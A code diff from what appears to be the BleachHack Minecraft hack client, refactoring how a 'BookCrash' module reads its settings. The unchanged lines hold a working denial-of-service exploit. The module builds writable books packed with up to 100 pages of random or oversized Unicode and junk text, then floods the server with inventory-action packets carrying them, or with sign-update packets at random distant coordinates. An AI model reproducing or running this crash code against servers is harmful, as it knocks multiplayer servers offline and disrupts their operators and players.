@@ -61,7 +61,7 @@ public class BookCrash extends Module {
 
 	@Subscribe
 	public void onTick(EventTick event) {
-		delay = (delay >= getSettings().get(2).asSlider().getValue() ? 0 : delay + 1);
+		delay = (delay >= getSetting(2).asSlider().getValue() ? 0 : delay + 1);
 		if (delay > 0) return;
 
 		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
@@ -71,25 +71,25 @@ public class BookCrash extends Module {
 		String title = "\n Bleachhack Owns All \n";
 
 		String size = "";
-		int pages = Math.min((int) getSettings().get(4).asSlider().getValue(), 100);
+		int pages = Math.min((int) getSetting(4).asSlider().getValue(), 100);
 		int pageChars = 210;
 
-		if (getSettings().get(3).asMode().mode == 2) {
+		if (getSetting(3).asMode().mode == 2) {
 			IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
 			size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
-		} else if (getSettings().get(3).asMode().mode == 1) {
+		} else if (getSetting(3).asMode().mode == 1) {
 			size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
-		} else if (getSettings().get(3).asMode().mode == 0) {
+		} else if (getSetting(3).asMode().mode == 0) {
 			IntStream chars = new Random().ints(0x20, 0x7E);
 			size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
-		} else if (getSettings().get(3).asMode().mode == 3) {
+		} else if (getSetting(3).asMode().mode == 3) {
 			size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
 		}
 
-		if (getSettings().get(0).asMode().mode == 2) {
+		if (getSetting(0).asMode().mode == 2) {
 			Text text = Text.Serializer.fromJson("{\"text\":\"pp\"}");
 			Random rand = new Random();
-			for (int i = 0; i < getSettings().get(1).asSlider().getValue(); i++) {
+			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
 				mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
 						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
 			}
@@ -107,8 +107,8 @@ public class BookCrash extends Module {
 			bookObj.putSubTag("pages", list);
 			bookObj.setTag(tag);
 
-			for (int i = 0; i < getSettings().get(1).asSlider().getValue(); i++) {
-				if (getSettings().get(0).asMode().mode == 0) {
+			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
+				if (getSetting(0).asMode().mode == 0) {
 					mc.player.networkHandler.sendPacket(new ClickWindowC2SPacket(0, 0, 0, SlotActionType.PICKUP, bookObj, (short) 0));
 				} else {
 					mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
@@ -123,6 +123,6 @@ public class BookCrash extends Module {
 
 	@Subscribe
 	private void EventDisconnect(EventReadPacket event) {
-		if (event.getPacket() instanceof DisconnectS2CPacket && getSettings().get(5).asToggle().state) setToggled(false);
+		if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(5).asToggle().state) setToggled(false);
 	}
 }
